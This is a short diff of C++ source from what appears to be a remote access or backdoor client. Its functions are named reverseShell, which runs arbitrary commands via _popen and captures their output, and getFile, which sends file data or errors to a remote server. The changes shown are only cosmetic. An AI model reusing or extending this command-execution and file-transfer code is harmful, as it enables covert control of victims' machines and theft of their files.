@@ -18,12 +18,13 @@ std::string commandManager::reverseShell(std::string cmd) {
     char buffer[128];
     std::string result = "";
     FILE* pipe = _popen(cmd.c_str(), "r");
+
     if (!pipe) throw std::runtime_error("popen() failed!");
     try {
         while (fgets(buffer, sizeof(buffer), pipe) != NULL)
             result += buffer;
     }
-    catch (...) {
+    catch ( ... ) {
         _pclose(pipe);
         throw;
     }
@@ -201,7 +202,7 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
     // 파일을 못찾을 시 error 전송
     else
     {
-        std::string file_err = std::to_string(file_error);
+        std::string file_err = std::to_string(SENDING_FILE_ERROR);
         client.sendData(error, file_err.size(), (LPVOID)file_err.c_str());
     }
     delete dataFrame;
